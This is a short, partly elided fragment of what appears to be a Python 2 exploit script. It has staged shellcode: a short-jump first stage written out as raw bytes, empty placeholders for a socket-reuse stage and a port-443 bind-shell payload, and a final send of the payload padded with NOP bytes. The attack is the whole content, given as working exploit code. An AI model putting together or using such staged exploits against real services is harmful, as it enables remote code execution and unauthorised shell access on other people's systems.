...
# 1st Stage Shellcode (Short JMP)
jmp_back = "\x54\x59\x83\xE9\x64\xFF\xE1"

# 2nd Stage Shellcode (Socket Reuse Exploit)
socket_reuse = ""
...
# 3rd Stage Shellcode (Bind Shell) - Port 443 (355 Bytes)
buf =  ""
...
print "[+] Sent Socket_reuse Payload... Wait for 5 seconds..."

time.sleep(5)
s.send(buf + "\x90" * (512 - len(buf)))
